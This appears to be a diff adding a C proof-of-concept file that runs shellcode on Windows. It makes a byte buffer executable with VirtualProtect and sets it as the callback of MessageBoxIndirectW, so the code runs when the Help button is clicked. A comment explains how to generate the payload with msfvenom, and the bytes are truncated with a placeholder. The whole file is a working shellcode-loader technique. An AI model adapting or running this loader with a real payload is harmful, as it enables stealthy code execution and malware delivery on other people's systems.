@@ -1,0 +1,44 @@
+// poc_msgbox_inject.c
+#include <windows.h>
+
+// ---
+// Replace this with your own msfvenom-generated x64 shellcode.
+// For example:
+//   msfvenom -p windows/x64/messagebox TEXT="Injected!" TITLE="POC" -f raw
+// and paste the bytes below as a C string.
+// ---
+unsigned char shellcode[] = 
+    "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
+    /* … more bytes … */
+    "\x00";  // null-terminator just in case
+
+int wmain(void)
+{
+    SIZE_T scSize = sizeof(shellcode);
+    DWORD oldProt;
+
+    // 1) Mark the shellcode buffer executable
+    if (!VirtualProtect(shellcode, scSize, PAGE_EXECUTE_READ, &oldProt)) {
+        fwprintf(stderr, L"[-] VirtualProtect failed: %u\n", GetLastError());
+        return 1;
+    }
+
+    // 2) Prepare MSGBOXPARAMSW
+    MSGBOXPARAMSW mbp = {0};
+    mbp.cbSize        = sizeof(mbp);
+    mbp.hwndOwner     = NULL;
+    mbp.hInstance     = GetModuleHandle(NULL);
+    mbp.lpszText      = L"Click Help to run shellcode";
+    mbp.lpszCaption   = L"MessageBox Injection POC";
+    mbp.dwStyle       = MB_HELP;
+    mbp.dwLanguageId  = MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT);
+
+    // 3) Point both the icon and the callback at our shellcode
+    mbp.lpszIcon            = (LPCWSTR)shellcode;
+    mbp.lpfnMsgBoxCallback  = (MSGBOXCALLBACK)shellcode;  // same address
+
+    // 4) Display the box; user must click “Help” to trigger the callback
+    MessageBoxIndirectW(&mbp);
+
+    return 0;
+}
